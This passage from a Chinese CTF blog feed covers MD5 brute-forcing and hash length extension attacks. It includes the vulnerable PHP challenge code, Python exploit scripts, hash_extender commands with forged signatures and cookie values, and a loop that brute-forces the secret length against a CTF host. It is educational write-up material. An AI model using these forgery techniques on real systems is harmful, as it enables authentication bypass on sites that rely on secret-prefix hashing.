class="string">'flag&#123;www_shiyanbar_com_is_very_good_'</span></span><br><span class="line">    <span class="keyword">while</span> count==0:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">            a=chr(i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                b=chr(i)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                    c=chr(i)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                        d=chr(i)</span><br><span class="line">                        <span class="built_in">test</span>=str+a+b+c+d+<span class="string">'&#125;'</span></span><br><span class="line">                        m=hashlib.md5()</span><br><span class="line">                        m.update(<span class="built_in">test</span>)</span><br><span class="line">                        m=m.hexdigest()</span><br><span class="line">                        <span class="keyword">if</span>(cmp(m,md5)==0):</span><br><span class="line">                             count=1</span><br><span class="line">                             <span class="built_in">print</span> <span class="string">'ok'</span></span><br><span class="line">                             <span class="built_in">print</span> <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">test</span>()</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure></p><h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><p>md5加盐爆破</p><p>题目：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have found a passwd file containing salted passwords. An unprotected configuration file has revealed a salt of 5948. The hashed password <span class="keyword">for</span> the <span class="string">'admin'</span> user appears to be 81bdf501ef206ae7d3b92070196f7e98, try to brute force this password.</span><br></pre></td></tr></table></figure></p><p>python 脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf -*-</span></span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    f=open(<span class="string">'1.txt'</span>,<span class="string">'rb'</span>).readlines()</span><br><span class="line">    salt=<span class="string">'5948'</span></span><br><span class="line">    m=<span class="string">'81bdf501ef206ae7d3b92070196f7e98'</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        t=line.strip()+salt</span><br><span class="line">        t=md5(t).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t==m:</span><br><span class="line">            <span class="built_in">print</span> line.strip()</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;几道 MD5 爆破问题&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="Web" scheme="http://archimesan.me/categories/CTF/Web/"/>
    
    
      <category term="md5" scheme="http://archimesan.me/tags/md5/"/>
    
  </entry>
  
  <entry>
    <title>hash长度扩展攻击</title>
    <link href="http://archimesan.me/2017/12/23/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://archimesan.me/2017/12/23/hash长度扩展攻击/</id>
    <published>2017-12-23T11:18:25.000Z</published>
    <updated>2019-03-25T03:08:10.015Z</updated>
    
    <content type="html"><![CDATA[<p>hash 长度扩展攻击原理和实例</p><a id="more"></a><h1 id="sha1-的-hash-原理"><a href="#sha1-的-hash-原理" class="headerlink" title="sha1 的 hash 原理"></a>sha1 的 hash 原理</h1><p>谈一下对 sha1 加密的理解。</p><p><img src="1.jpeg" alt></p><p>首先，当 hash 函数拿到需要被 hash 的字符串后，先将其字节长度整除 64，取得余数。如果该余数正好等于 56，那么就在该字符串最后添加上 8 个字节的长度描述符（具体用bit表示）。如果不等于 56，就先对字符串进行长度填充，填充时第一个字节为 hex(80)，其他字节均用 hex(00) 填充，填充至余数为 56 后，同样增加 8 个字节的长度描述符（该长度描述符为需要被 hash 的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。</p><p>补位完成后，字符串以 64 位一组进行分组（因为上面的余数为 56,加上 8 个字节的长度描述符后，正好是 64 位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的 registers 值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的 registers 值就是最后的 hash 值。</p><p>在 sha1 的运算过程中，为确保同一个字符串的 sha1 值唯一，所以需要保证第一次 registers 的值也唯一。所以在 sha1 算法中，registers 具有初始值（固定的）。如上图中的 registers 值 0。<br>Hash 值的随机性完全依赖于进行 “复杂的数学变化” 时输入的 registers 值和该次运算中字符串分组的数据。如果进行 “复杂数学变化” 时输入的 registers 值和该次运算的字符串分组相同，那么他们各自生成的新的 registers 值也相同。</p><h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>当需要被 hash 的字符串为 str_a = “123456”，程序首先判断，len(str_a) % 64 == 56 是否成立。这里很明显不成立。那么程序就进行补位操作。首先补位成余数为 56 的长度。</p><p><img src="2.jpeg" alt></p><p>如上图，蓝色字体就为程序对该字符串进行补位的数据。当满足 len(str_a) % 64 == 56 后，程序就在该字符串的后面添加 8 个字节的长度描述符。注意，此处的长度为原始需要被 hash 的长度。也就是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len(str_a) = 6 字节 *8bit/字节 = 48bit = 0x30bit。</span><br></pre></td></tr></table></figure></p><p><img src="3.jpeg" alt></p><p>补位+长度描述符 = 64 个字节，正好是一个分组。所以此处只要进行一次复杂的数学变化就可以了。程序根据该 64 个字节的数据和 registers 值 0 生成新的 registers 值 1。那么该新的 registers 值 1 就是 str_a 的 sha1 值。</p><h2 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h2><p>讲了这么多，好像都没讲到如何利用该扩展攻击。那么下面，重点来了。</p><p>简单来说，就是服务器上会生成一个 salt 值，该 salt 值你是不可预测的。但是你又知道了 sha1(salt+filename)的值，该 filename 的值你也是知道的。假设此处的 filename 的值 report.pdf，最后 sha1 的值为：0a8d538b724c6f2b4288526eb540ee7c。为了方便理解，我们继续假设 salt 的长度为 16 位。</p><p><img src="4.jpeg" alt></p><p>将上图的字符串进行 sha1 操作时，同样先进行整除，然后取余。最后再补上 8 位的长度描述符。补位+添加长度描述符后的字符串如下图：</p><p><img src="5.jpeg" alt></p><p>该长度也就满足了 64 位的分组，只需要进行一次 “复杂的数学运算” 就可以得到最后的sha1值了。<br>下面请各位看官思考如何进行下面一个字符串的 sha1 操作。</p><p><img src="6.jpeg" alt></p><p>同样，还是先进行分组。由于该字符串的长度大于 64 个字节，且小于 128 个字节，所以要分成两组，需要进行两次“复杂的数学运算”。这个时候我们发现，第一个分组的数据和上图中补码后的数据完全一样，又因为他们都是第一个分组，初始的 registers 值也一样。那么经过第一轮“复杂的数学运算”，他们各自生成的 registers 值也同样是相同的。唯一不同的是，由于上面的长度小于 64 字节，所以只需要进行一轮运算便得到了最后的 sha1 值。然后这里的字符串有两个分组，需要将第一轮更新的 registers 值（也就是第一轮运算出来的 sha1 值）作为第二轮“复杂的数学运算”的 registers 值，然后才能得出最终的 sha1 值。</p><p>根据上面例子就说明，如果 salt 的值你不知道，但是你知道长度，又知道 sha1(salt)，那么就也就可以知道 sha1(salt+“填充数据”+“任意可控数据”).这里的 salt+“填充数据”就是对 salt 进行 sha1 时所补全的数据+最后8位的长度描述符。一般来说，salt+”填充数据”的长度就是64字节，正好是一个分组。如果 salt 的长度就大于了56个字节，那么加入填充数据后的长度应该是N个64字节，等于 N 个分组。如果最后一块长度大于 56 或等于 64 时一直填充到多出一个块并且该块长度为 56 字节。<br>为什么？你可以想象，sha1 程序再对（salt+“填充数据”+“任意可控数据”）进行 hash 时，只需要进行第二轮及第二轮以后的运算。因为第一轮运算后的 registers 值就是 sha1(salt)的值，该值你已经知道了。</p><p>PS : MD5、SHA-1、SHA-2 类似</p><h1 id="hash-长度扩展攻击实例"><a href="#hash-长度扩展攻击实例" class="headerlink" title="hash 长度扩展攻击实例"></a>hash 长度扩展攻击实例</h1><h2 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h2><p><img src="1.png" alt></p><p><img src="2.png" alt></p><p><img src="3.png" alt></p><p><img src="4.png" alt></p><p>源码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">samplehash='</span>571580b26c65f306376d4f64e53cb5c7<span class="string">'</span></span><br><span class="line"><span class="string">s1='</span>0x<span class="string">'+samplehash[6:8]+samplehash[4:6]+samplehash[2:4]+samplehash[0:2]</span></span><br><span class="line"><span class="string">s2='</span>0x<span class="string">'+samplehash[14:16]+samplehash[12:14]+samplehash[10:12]+samplehash[8:10]</span></span><br><span class="line"><span class="string">s3='</span>0x<span class="string">'+samplehash[22:24]+samplehash[20:22]+samplehash[18:20]+samplehash[16:18]</span></span><br><span class="line"><span class="string">s4='</span>0x<span class="string">'+samplehash[30:32]+samplehash[28:30]+samplehash[26:28]+samplehash[24:26]</span></span><br><span class="line"><span class="string">print s1,'</span>\n<span class="string">',s2,'</span>\n<span class="string">',s3,'</span>\n<span class="string">',s4</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author：DshtAnger</span></span><br><span class="line">import my_md5</span><br><span class="line"><span class="comment">#reference:</span></span><br><span class="line"><span class="comment">#   http://www.freebuf.com/articles/web/69264.html</span></span><br><span class="line"><span class="comment">#problem link:</span></span><br><span class="line"><span class="comment">#   http://ctf4.shiyanbar.com/web/kzhan.php</span></span><br><span class="line"></span><br><span class="line">samplehash=<span class="string">"571580b26c65f306376d4f64e53cb5c7"</span></span><br><span class="line"><span class="comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span></span><br><span class="line">s1=0xb2801557</span><br><span class="line">s2=0x06f3656c</span><br><span class="line">s3=0x644f6d37</span><br><span class="line">s4=0xc7b53ce5</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(s1)</span><br></pre></td></tr></table></figure></p><p>exp：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">secret = <span class="string">"a"</span>*15</span><br><span class="line">secret_admin = secret+<span class="string">'adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin'</span></span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_admin)</span><br><span class="line">inp = r[len(r)/2:]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"getmein:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br></pre></td></tr></table></figure></p><p>burp抓包改包：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=admin+\x80\x00……admin</span><br><span class="line">\x80\x00要在hex里面修改</span><br></pre></td></tr></table></figure></p><p><img src="5.png" alt></p><p><img src="6.png" alt></p><h2 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h2><p>源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$SECRET</span>=<span class="string">"234098761"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="literal">false</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="literal">true</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="variable">$auth</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$auth</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>]);  //先给<span class="variable">$auth</span>赋一个真值</span><br><span class="line">        <span class="variable">$hsh</span>=<span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$hsh</span> !== <span class="built_in">hash</span>(<span class="string">"sha256"</span>,<span class="variable">$SECRET</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>])))</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$auth</span>=<span class="literal">false</span>;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"hsh is error! &lt;br /&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$s</span>=serialize(<span class="variable">$auth</span>);</span><br><span class="line">        setcookie(<span class="string">"auth"</span>,<span class="variable">$s</span>);</span><br><span class="line">        setcookie(<span class="string">"hsh"</span>,<span class="built_in">hash</span>(<span class="string">"sha256"</span>,<span class="variable">$SECRET</span>.strrev(<span class="variable">$s</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"succusel &lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"fails &lt;br /&gt;"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：<br>strrev()  反转字符串<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ./hash_extender -f sha256 -l 9 -d <span class="string">';0:b'</span> -s feab615a09e9c09c1c79e806337bf73450786f1026ef88cf23a0c775b9c28391 -a <span class="string">';1:b'</span> --out-data-format=html  </span><br><span class="line"></span><br><span class="line">Type: sha256  </span><br><span class="line">Secret length: 9  </span><br><span class="line">New signature: 4cd85bfa32cfded3b01ed2a18af281c7dfd8118fdb3ce2d0d729f48fecbb1560  </span><br><span class="line">New string: %3b0%3ab%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%3b1%3ab</span><br></pre></td></tr></table></figure></p><p>从上面算得的值hash值是 sha256(key || padding || append) append的值是true的值。将cookie中的hsh换成上面的生成的新hash,再把上面的string逆序下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b%3a1%3bh%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b</span><br></pre></td></tr></table></figure></p><p>用上面的字符串修改auth的cookie值，再访问此网页就会认证成功了：</p><p><img src="7.png" alt></p><h2 id="实例3"><a href="#实例3" class="headerlink" title="实例3"></a>实例3</h2><p>secret长度不知道暴力攻击</p><p>题目：flag在管理员手里</p><p><img src="3_1.png" alt></p><p><img src="3_2.png" alt></p><p>用御剑 1.5 扫描 找到 index.php~  打开都是乱码<br>拷贝至 linux 虚拟机名字改成 .index.php.swp<br>vim -r index.php  保存即可</p><p>得到的代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background:gray;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$role</span> = <span class="string">"guest"</span>;</span><br><span class="line"><span class="variable">$salt</span> = </span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>])) &#123;</span><br><span class="line"><span class="variable">$role</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]);</span><br><span class="line"><span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))) &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$role</span>);</span><br><span class="line">setcookie(<span class="string">'role'</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$hsh</span> = md5(<span class="variable">$salt</span>.strrev(<span class="variable">$s</span>));</span><br><span class="line">setcookie(<span class="string">'hsh'</span>,<span class="variable">$hsh</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>很明显secret长度不知道，只能通过爆破</p><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from urlparse import urlparse</span><br><span class="line">from httplib import HTTPConnection</span><br><span class="line">from urllib import urlencode</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def gao(x, y):</span><br><span class="line">    <span class="comment">#print x</span></span><br><span class="line">    <span class="comment">#print y</span></span><br><span class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">";hsh="</span> + y</span><br><span class="line">        <span class="comment">#print cookie</span></span><br><span class="line">    build_header = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">' Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    urlparts = urlparse(url)</span><br><span class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)</span><br><span class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</span><br><span class="line">    resp = conn.getresponse()</span><br><span class="line">    body = resp.read()</span><br><span class="line">    <span class="built_in">return</span> body</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(1000):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    <span class="comment"># secret len = ???</span></span><br><span class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></span><br><span class="line">    <span class="comment">#print find_hash</span></span><br><span class="line">    calc_res = os.popen(find_hash).readlines()</span><br><span class="line">    hash_value = calc_res[0][:32]</span><br><span class="line">    attack_padding = calc_res[0][32:]</span><br><span class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])</span><br><span class="line">    ret = gao(attack_padding, hash_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="built_in">print</span> ret</span><br><span class="line">        <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p><p>将上述代码保存至 hash_extender.py<br>到 hash_extender 的目录下运行 python hash_extender.py 得到如下：</p><p><img src="3_3.png" alt></p><h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><h2 id="HashExtender和hashdump使用"><a href="#HashExtender和hashdump使用" class="headerlink" title="HashExtender和hashdump使用"></a>HashExtender和hashdump使用</h2><h3 id="HashExtender"><a href="#HashExtender" class="headerlink" title="HashExtender"></a>HashExtender</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Installing</span><br><span class="line">$ pip install 